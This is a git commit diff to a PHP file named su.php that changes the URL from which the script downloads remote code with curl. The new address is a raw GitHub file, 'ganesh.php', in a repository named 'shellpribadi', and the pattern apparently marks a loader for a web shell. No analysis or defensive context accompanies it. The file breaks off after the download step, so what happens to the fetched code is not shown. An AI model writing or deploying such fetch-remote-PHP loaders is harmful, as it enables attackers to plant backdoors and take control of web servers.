081169ce3c6e8e2f0b837a514c8f2b3f0e460851
Botem7 <botemmm7@gmail.com>
2025-01-15 03:18:40 +0700

    Update su.php

--- su.php
+++ su.php
@@ -1,5 +1,5 @@
 <?php 
-$url = "http://ndot.us/za";
+$url = "https://raw.githubusercontent.com/zer04lone/shellpribadi/main/ganesh.php";
 $ch = curl_init($url); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
